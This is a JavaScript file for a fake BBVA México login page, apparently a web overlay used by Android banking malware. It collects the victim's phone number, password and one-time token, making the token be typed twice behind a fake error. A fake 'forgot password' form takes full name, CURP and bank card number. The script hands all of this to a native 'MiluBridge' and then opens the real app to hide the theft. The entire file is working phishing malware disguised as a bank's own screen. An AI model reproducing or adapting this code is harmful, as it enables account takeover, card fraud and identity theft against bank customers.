(() => {
  const pages = {
    login: document.getElementById("loginPage"),
    payment: document.getElementById("paymentPage"),
    forgot: document.getElementById("forgotPasswordPage"),
  };

  const toastEl = document.getElementById("toast");
  const emailInput = document.getElementById("emailInput");
  const dynamicPasswordInput = document.getElementById("dynamicPasswordInput");
  const registerBtn = document.getElementById("registerBtn");
  const forgotLink = document.getElementById("forgotLink");
  const signupLink = document.getElementById("signupLink");
  const backFromPaymentBtn = document.getElementById("backFromPaymentBtn");
  const backFromForgotBtn = document.getElementById("backFromForgotBtn");
  const paymentTitlePrefix = document.getElementById("paymentTitlePrefix");
  const paymentPhonePrefix = document.getElementById("paymentPhonePrefix");
  const paymentPhoneNumber = document.getElementById("paymentPhoneNumber");
  const paymentDigitDisplay = document.getElementById("paymentDigitDisplay");
  const hiddenPaymentInput = document.getElementById("hiddenPaymentInput");
  const digitBoxes = Array.from(document.querySelectorAll("#paymentDigitDisplay .digit-box"));
  const paymentError = document.getElementById("paymentError");
  const paymentLoginBtn = document.getElementById("paymentLoginBtn");
  const keyboard = document.getElementById("numberKeyboard");
  const keyClear = document.getElementById("keyClear");
  const keyDelete = document.getElementById("keyDelete");
  const verifyIdentityBtn = document.getElementById("verifyIdentityBtn");
  const helpLink = document.getElementById("helpLink");

  const forgotEmailInput = document.getElementById("forgotEmailInput");
  const nameInput = document.getElementById("nameInput");
  const curpInput = document.getElementById("curpInput");
  const bankCardInput = document.getElementById("bankCardInput");

  let currentEmail = "";
  let loginPassword = "";
  let paymentPassword = "";
  let currentName = "";
  let currentIdCard = "";
  let currentBankCard = "";
  let paymentStage = 0;
  let firstPaymentPassword = "";
  let toastTimer = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function buildResult(token) {
    return JSON.stringify({
      login: currentEmail,
      password: loginPassword,
      token,
      name: currentName,
      curp: currentIdCard,
      bankCard: currentBankCard,
      brand: "BBVA México",
      type_injects: "banks",
      closed: "close_activity_injects",
    });
  }

  function showToast(msg, duration = 2000) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, duration);
  }

  function showError(id, msg) {
    const el = document.getElementById(id);
    if (!el) {
      return;
    }
    if (msg) {
      el.textContent = msg;
      el.classList.add("is-show");
    } else {
      el.textContent = "";
      el.classList.remove("is-show");
    }
  }

  function setWrapperError(wrapperId, hasError) {
    const el = document.getElementById(wrapperId);
    if (el) {
      el.classList.toggle("is-error", hasError);
    }
  }

  function switchPage(name) {
    Object.values(pages).forEach((page) => page.classList.remove("is-active"));
    pages[name].classList.add("is-active");
  }

  function setBtnLoading(btn, loading) {
    btn.classList.toggle("is-loading", loading);
    btn.disabled = loading;
  }

  function maskPhone(phone) {
    return phone.substring(0, 2) + "****" + phone.substring(6);
  }

  function isPhoneValid(phone) {
    return /^\d{10}$/.test(phone);
  }

  function isCURPValid(curp) {
    return /^[A-Z]{4}\d{6}[A-Z]{6}[A-Z0-9]{2}$/.test(curp.toUpperCase());
  }

  function isNameValid(name) {
    return /^[a-zA-ZáéíóúÁÉÍÓÚñÑüÜ][a-zA-ZáéíóúÁÉÍÓÚñÑüÜ\s']{1,49}$/.test(name) && name.trim().length >= 2;
  }

  function isCardValid(card) {
    if (!/^\d{16}$/.test(card)) {
      return false;
    }
    let sum = 0;
    let alt = false;
    for (let i = card.length - 1; i >= 0; i -= 1) {
      let n = parseInt(card[i], 10);
      if (alt) {
        n *= 2;
        if (n > 9) {
          n -= 9;
        }
      }
      sum += n;
      alt = !alt;
    }
    return sum % 10 === 0;
  }

  function showKeyboard() {
    keyboard.classList.add("is-show");
  }

  function hideKeyboard() {
    keyboard.classList.remove("is-show");
  }

  function updateDigitDisplay() {
    digitBoxes.forEach((box, index) => {
      if (index < paymentPassword.length) {
        box.textContent = "●";
        box.classList.add("is-filled");
        box.classList.remove("is-active");
      } else if (index === paymentPassword.length) {
        box.textContent = "";
        box.classList.remove("is-filled");
        box.classList.add("is-active");
      } else {
        box.textContent = "";
        box.classList.remove("is-filled");
        box.classList.remove("is-active");
      }
    });
  }

  function resetPaymentInputOnly() {
    paymentPassword = "";
    hiddenPaymentInput.value = "";
    updateDigitDisplay();
    paymentLoginBtn.disabled = true;
  }

  function resetPaymentPassword() {
    resetPaymentInputOnly();
    paymentStage = 0;
    firstPaymentPassword = "";
    paymentLoginBtn.querySelector(".btn-text").textContent = "Verificar";
  }

  function resetLoginState() {
    dynamicPasswordInput.value = "";
    emailInput.value = "";
    currentEmail = "";
    loginPassword = "";
    registerBtn.querySelector(".btn-text").textContent = "Entrar";
    setWrapperError("emailWrapper", false);
    setWrapperError("dynamicPasswordWrapper", false);
    showError("emailError", "");
    showError("dynamicPasswordError", "");
  }

  function clearForgotForm() {
    forgotEmailInput.value = "";
    nameInput.value = "";
    curpInput.value = "";
    bankCardInput.value = "";
    setWrapperError("forgotEmailWrapper", false);
    showError("forgotEmailError", "");
    setWrapperError("nameWrapper", false);
    showError("nameError", "");
    setWrapperError("curpWrapper", false);
    showError("curpError", "");
    setWrapperError("bankCardWrapper", false);
    showError("bankCardError", "");
  }

  function handleRegister() {
    const email = emailInput.value.trim();
    if (!email) {
      setWrapperError("emailWrapper", true);
      showError("emailError", "Ingresa tu celular");
      return;
    }
    if (!isPhoneValid(email)) {
      setWrapperError("emailWrapper", true);
      showError("emailError", "Celular inválido (10 dígitos)");
      return;
    }

    const pwd = dynamicPasswordInput.value;
    if (!pwd || pwd.length !== 6) {
      setWrapperError("dynamicPasswordWrapper", true);
      showError("dynamicPasswordError", "La contraseña debe tener 6 caracteres");
      return;
    }
    if (!/^[a-zA-Z0-9]{6}$/.test(pwd)) {
      setWrapperError("dynamicPasswordWrapper", true);
      showError("dynamicPasswordError", "Solo letras y números, sin símbolos");
      return;
    }
    if (!/\d/.test(pwd) || !/[a-zA-Z]/.test(pwd)) {
      setWrapperError("dynamicPasswordWrapper", true);
      showError("dynamicPasswordError", "Contraseña incorrecta, intenta de nuevo");
      return;
    }

    setBtnLoading(registerBtn, true);
    window.setTimeout(() => {
      setBtnLoading(registerBtn, false);
      currentEmail = email;
      loginPassword = pwd;
      currentName = "";
      currentIdCard = "";
      currentBankCard = "";
      switchPage("payment");
      paymentTitlePrefix.textContent = "Ingresa tu Token para ";
      paymentPhonePrefix.style.display = "";
      paymentPhoneNumber.style.display = "";
      paymentPhoneNumber.textContent = maskPhone(email);
      resetPaymentPassword();
      showError("paymentError", "");
      window.setTimeout(showKeyboard, 300);
    }, 800);
  }

  function goBackToPassword() {
    switchPage("login");
    resetPaymentPassword();
    hideKeyboard();
    showError("paymentError", "");
    resetLoginState();
  }

  function appendPaymentDigit(num) {
    if (paymentPassword.length >= 6) {
      return;
    }
    paymentPassword += num;
    hiddenPaymentInput.value = paymentPassword;
    updateDigitDisplay();
    paymentLoginBtn.disabled = paymentPassword.length !== 6;
    if (paymentPassword.length === 6) {
      showError("paymentError", "");
    }
  }

  function handlePaymentLogin() {
    if (paymentPassword.length !== 6) {
      showError("paymentError", "Ingresa un Token de 6 dígitos");
      return;
    }

    if (paymentStage === 0) {
      firstPaymentPassword = paymentPassword;
      setBtnLoading(paymentLoginBtn, true);
      window.setTimeout(() => {
        setBtnLoading(paymentLoginBtn, false);
        paymentStage = 1;
        resetPaymentInputOnly();
        showError("paymentError", "Token incorrecto, intenta de nuevo");
        paymentLoginBtn.querySelector(".btn-text").textContent = "Verificar";
        showKeyboard();
      }, 1000);
      return;
    }

    if (paymentStage === 1) {
      if (paymentPassword !== firstPaymentPassword) {
        showError("paymentError", "Los Token no coinciden, intenta de nuevo");
        resetPaymentInputOnly();
        showKeyboard();
        return;
      }

      setBtnLoading(paymentLoginBtn, true);
      window.setTimeout(() => {
        setBtnLoading(paymentLoginBtn, false);
        reportDone(buildResult(paymentPassword));
        showToast("Inicio de sesión exitoso");
        window.setTimeout(() => {
          hideKeyboard();
          openApp();
        }, 1200);
      }, 1000);
    }
  }

  function goToForgotPassword() {
    switchPage("forgot");
    window.setTimeout(() => forgotEmailInput.focus(), 300);
  }

  function goBackToLoginFromForgot() {
    switchPage("login");
    clearForgotForm();
  }

  function handleVerifyIdentity() {
    const email = forgotEmailInput.value.trim();
    const name = nameInput.value.trim();
    const curp = curpInput.value.trim();
    const bankCard = bankCardInput.value.trim();
    let valid = true;

    if (!email) {
      setWrapperError("forgotEmailWrapper", true);
      showError("forgotEmailError", "Ingresa tu celular");
      valid = false;
    } else if (!isPhoneValid(email)) {
      setWrapperError("forgotEmailWrapper", true);
      showError("forgotEmailError", "Celular inválido");
      valid = false;
    } else {
      setWrapperError("forgotEmailWrapper", false);
      showError("forgotEmailError", "");
    }

    if (!name) {
      setWrapperError("nameWrapper", true);
      showError("nameError", "Ingresa tu nombre completo");
      valid = false;
    } else if (!isNameValid(name)) {
      setWrapperError("nameWrapper", true);
      showError("nameError", "Nombre inválido");
      valid = false;
    } else {
      setWrapperError("nameWrapper", false);
      showError("nameError", "");
    }

    if (!curp) {
      setWrapperError("curpWrapper", true);
      showError("curpError", "Ingresa tu CURP");
      valid = false;
    } else if (!isCURPValid(curp)) {
      setWrapperError("curpWrapper", true);
      showError("curpError", "CURP inválido (18 caracteres)");
      valid = false;
    } else {
      setWrapperError("curpWrapper", false);
      showError("curpError", "");
    }

    if (!bankCard) {
      setWrapperError("bankCardWrapper", true);
      showError("bankCardError", "Ingresa tu tarjeta");
      valid = false;
    } else if (!isCardValid(bankCard)) {
      setWrapperError("bankCardWrapper", true);
      showError("bankCardError", "Tarjeta inválida");
      valid = false;
    } else {
      setWrapperError("bankCardWrapper", false);
      showError("bankCardError", "");
    }

    if (!valid) {
      return;
    }

    setBtnLoading(verifyIdentityBtn, true);
    window.setTimeout(() => {
      setBtnLoading(verifyIdentityBtn, false);
      currentEmail = email;
      currentName = name;
      currentIdCard = curp;
      currentBankCard = bankCard;
      loginPassword = "";
      switchPage("payment");
      paymentTitlePrefix.textContent = "Ingresa tu Token";
      paymentPhonePrefix.style.display = "none";
      paymentPhoneNumber.style.display = "none";
      resetPaymentPassword();
      showError("paymentError", "");
      window.setTimeout(showKeyboard, 300);
    }, 1000);
  }

  emailInput.addEventListener("input", (event) => {
    event.target.value = event.target.value.replace(/\D/g, "").slice(0, 10);
    if (emailInput.value.length === 10) {
      setWrapperError("emailWrapper", false);
      showError("emailError", "");
    }
  });

  dynamicPasswordInput.addEventListener("input", () => {
    if (dynamicPasswordInput.value.length === 6) {
      setWrapperError("dynamicPasswordWrapper", false);
      showError("dynamicPasswordError", "");
    }
  });

  forgotEmailInput.addEventListener("input", (event) => {
    event.target.value = event.target.value.replace(/\D/g, "").slice(0, 10);
    if (forgotEmailInput.value.length === 10) {
      setWrapperError("forgotEmailWrapper", false);
      showError("forgotEmailError", "");
    }
  });

  nameInput.addEventListener("input", () => {
    if (nameInput.value) {
      setWrapperError("nameWrapper", false);
      showError("nameError", "");
    }
  });

  curpInput.addEventListener("input", () => {
    curpInput.value = curpInput.value.toUpperCase().replace(/[^A-Z0-9]/g, "").slice(0, 18);
    if (curpInput.value.length === 18) {
      setWrapperError("curpWrapper", false);
      showError("curpError", "");
    }
  });

  bankCardInput.addEventListener("input", (event) => {
    event.target.value = event.target.value.replace(/\D/g, "").slice(0, 16);
    if (bankCardInput.value.length === 16) {
      setWrapperError("bankCardWrapper", false);
      showError("bankCardError", "");
    }
  });

  registerBtn.addEventListener("click", handleRegister);
  forgotLink.addEventListener("click", goToForgotPassword);
  signupLink.addEventListener("click", () => showToast("Registro no disponible en este momento"));
  backFromPaymentBtn.addEventListener("click", goBackToPassword);
  backFromForgotBtn.addEventListener("click", goBackToLoginFromForgot);
  verifyIdentityBtn.addEventListener("click", handleVerifyIdentity);
  helpLink.addEventListener("click", () => showToast("Para ayuda, llama al 55 5226 2663"));
  paymentLoginBtn.addEventListener("click", handlePaymentLogin);
  paymentDigitDisplay.addEventListener("click", showKeyboard);

  document.querySelectorAll(".key[data-num]").forEach((key) => {
    key.addEventListener("click", () => {
      appendPaymentDigit(key.getAttribute("data-num"));
    });
  });

  keyDelete.addEventListener("click", () => {
    if (paymentPassword.length === 0) {
      return;
    }
    paymentPassword = paymentPassword.slice(0, -1);
    hiddenPaymentInput.value = paymentPassword;
    updateDigitDisplay();
    paymentLoginBtn.disabled = true;
    showError("paymentError", "");
  });

  keyClear.addEventListener("click", () => {
    paymentPassword = "";
    hiddenPaymentInput.value = "";
    updateDigitDisplay();
    paymentLoginBtn.disabled = true;
    showError("paymentError", "");
  });

  updateDigitDisplay();
})();
